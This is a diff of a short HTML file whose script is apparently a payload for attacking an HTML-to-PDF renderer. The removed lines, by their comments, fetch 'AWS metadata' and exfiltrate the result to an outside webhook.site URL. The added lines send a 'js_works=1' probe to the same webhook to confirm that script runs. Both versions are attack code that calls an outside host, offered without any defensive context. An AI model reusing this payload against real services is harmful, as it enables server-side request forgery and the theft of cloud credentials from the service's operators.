@@ -1,17 +1,8 @@
 <html>
 <body>
 <script>
-(async () => {
-  // Fetch AWS metadata – start with the root directory
-  const resp = await fetch('https://webhook.site/1be56e61-1b58-4dfc-8d52-cc9304f503e9');
-  const data = await resp.text();
-  
-  // Exfiltrate to your webhook
-  await fetch('https://webhook.site/1be56e61-1b58-4dfc-8d52-cc9304f503e9?m=' + encodeURIComponent(data));
-  
-  // Also populate the page body (optional, for PDF visibility)
-  document.body.innerText = data;
-})();
+fetch('https://webhook.site/1be56e61-1b58-4dfc-8d52-cc9304f503e9?js_works=1')
+  .then(r => console.log('sent'));
 </script>
 </body>
 </html>
